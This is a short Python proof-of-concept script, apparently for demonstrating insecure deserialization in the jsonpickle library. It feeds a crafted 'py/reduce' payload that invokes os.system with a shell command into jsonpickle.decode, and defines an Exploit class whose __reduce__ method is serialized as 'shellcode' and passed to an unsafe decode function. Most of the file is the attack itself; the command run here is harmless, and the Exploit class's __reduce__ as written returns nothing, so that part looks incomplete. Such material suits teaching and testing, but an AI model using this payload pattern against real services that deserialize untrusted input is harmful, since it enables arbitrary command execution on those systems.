import os
import jsonpickle

jsonpickle.decode('{"py/reduce": [{"py/function": "os.system"}, ["dir"]]}', safe=True)


# Exploit that we want the target to unpickle
class Exploit(object):
    def __reduce__(self):
        # Note: this will only list files in your directory.
        # It is a proof of concept.
        print("I can do whatever I want from here.")
        # os.chdir("../")
        # files = os.listdir()
        # for file in files:
        #     print(file)


def serialize_exploit():
    shellcode = jsonpickle.encode(Exploit())
    print(shellcode)
    return shellcode


def insecure_deserialize(exploit_code):
    jsonpickle.decode(exploit_code)


if __name__ == '__main__':
    shellcode = serialize_exploit()
    print('Yar, here be yer files.')
    insecure_deserialize(shellcode)